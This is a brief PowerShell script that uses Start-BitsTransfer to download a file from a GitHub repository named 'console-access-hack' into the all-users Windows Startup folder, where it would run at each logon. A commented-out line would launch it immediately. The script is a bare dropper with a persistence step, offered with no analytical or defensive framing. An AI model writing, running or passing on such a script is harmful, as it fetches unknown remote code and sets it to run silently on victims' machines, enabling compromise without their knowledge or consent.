$url = "https://raw.githubusercontent.com/keltonxgame/console-access-hack/main/console.pyn"
$dest = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Start-BitsTransfer -Source $url -Destination $dest 

# start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

exit
